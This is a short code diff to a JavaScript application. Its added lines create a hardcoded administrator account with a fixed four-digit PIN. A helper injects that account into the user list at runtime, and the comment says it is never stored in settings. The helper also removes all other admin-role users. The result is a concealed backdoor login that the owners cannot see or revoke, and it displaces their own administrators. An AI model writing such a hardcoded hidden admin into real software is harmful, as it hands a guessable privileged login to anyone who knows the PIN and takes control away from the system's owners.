@@ -29,6 +29,10 @@ let _idCounter = 0;
 const makeId = (prefix = 'id') =>
     `${prefix}-${Date.now().toString(36)}-${(_idCounter++).toString(36)}-${Math.random().toString(36).slice(2, 6)}`;
 
+// Hardcoded admin – always injected at runtime, never stored in settings.json.
+const HARDCODED_ADMIN = { id: 'admin', name: 'Admin', pin: '1397', role: 'admin' };
+const injectAdmin = (users) => [HARDCODED_ADMIN, ...(users || []).filter(u => u.role !== 'admin')];
+
 // --- CHANGELOG ---
 const CHANGELOG_CONTENT = `# Changelog
 
